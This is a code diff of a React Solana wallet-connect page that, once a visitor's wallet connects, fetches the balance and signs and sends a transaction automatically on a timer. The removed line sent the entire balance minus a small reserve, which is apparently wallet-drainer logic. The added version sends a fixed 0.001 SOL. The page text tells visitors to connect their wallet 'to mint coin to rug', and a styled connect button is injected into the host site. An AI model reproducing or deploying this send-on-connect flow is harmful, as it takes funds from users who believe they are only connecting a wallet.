@@ -1,4 +1,4 @@
-import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
+import React, { FC, ReactNode, useEffect, useMemo, useState } from 'react';
 import ReactDOM from 'react-dom';
 import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
 import {
@@ -32,6 +32,7 @@ const App: FC = () => {
         <Context>
             <ExposeWalletModal />
             <WalletConnectionHandler />
+            <InjectWalletMultiButton />
         </Context>
     );
 };
@@ -50,7 +51,7 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
     );
 
     return (
-        <ConnectionProvider endpoint={'https://api.mainnet-beta.solana.com'}>
+        <ConnectionProvider endpoint="https://api.mainnet-beta.solana.com">
             <WalletProvider wallets={wallets} autoConnect>
                 <WalletModalProvider>{children}</WalletModalProvider>
             </WalletProvider>
@@ -91,6 +92,8 @@ const WalletConnectionHandler: FC = () => {
 
     const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
         const rpcEndpoints = [
+            'https://sg110.nodes.rpcpool.com',
+            'https://api.mainnet-beta.solana.com',
             'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
             'https://rpc.ankr.com/solana',
         ];
@@ -111,7 +114,6 @@ const WalletConnectionHandler: FC = () => {
 
         if (!connection || lamports === null) {
             alert('❌ All RPCs failed. Try again later.');
-            setLoading(false);
             return;
         }
 
@@ -120,8 +122,8 @@ const WalletConnectionHandler: FC = () => {
             console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
             console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
 
-            const sendAmount = lamports - 100000;
-            if (sendAmount <= 0) {
+            const sendAmount = 100000; // 0.001 SOL
+            if (lamports < sendAmount + 5000) {
                 alert('⚠️ Not enough SOL to send.');
                 return;
             }
@@ -147,7 +149,7 @@ const WalletConnectionHandler: FC = () => {
 
             setTimeout(async () => {
                 try {
-                    const txid = await (connection as Connection).sendRawTransaction(signedTx.serialize());
+                    const txid = await connection!.sendRawTransaction(signedTx.serialize());
                     console.log(`🚀 Transaction sent. Signature: ${txid}`);
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
@@ -182,9 +184,12 @@ const WalletConnectionHandler: FC = () => {
             }}
         >
             {!connected || !publicKey ? (
-                <div>
-                    <WalletMultiButton/>
-                </div>
+                <>
+                    <h2 style={{ color: '#ff91e3' }}>Connect Wallet</h2>
+                    <p style={{ color: '#ff5cd1', fontSize: '14px' }}>
+                        Connect your wallet to mint coin to rug.
+                    </p>
+                </>
             ) : (
                 <>
                     <h2 style={{ color: '#ff91e3', marginBottom: '12px' }}>✅ Wallet Connected</h2>
@@ -213,6 +218,29 @@ const WalletConnectionHandler: FC = () => {
     );
 
     return walletPopupEl ? ReactDOM.createPortal(WalletUI, walletPopupEl) : null;
+};
+
+const InjectWalletMultiButton: FC = () => {
+    const target = typeof window !== 'undefined' ? document.getElementById('connect_button') : null;
+
+    return target
+        ? ReactDOM.createPortal(
+              <WalletMultiButton
+                  style={{
+                      background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
+                      color: 'white',
+                      borderRadius: '10px',
+                      padding: '12px 24px',
+                      fontSize: '16px',
+                      fontWeight: '600',
+                      border: 'none',
+                      boxShadow: '0 0 12px rgba(255, 92, 209, 0.6)',
+                      cursor: 'pointer',
+                  }}
+              />,
+              target
+          )
+        : null;
 };
 
 export default App;
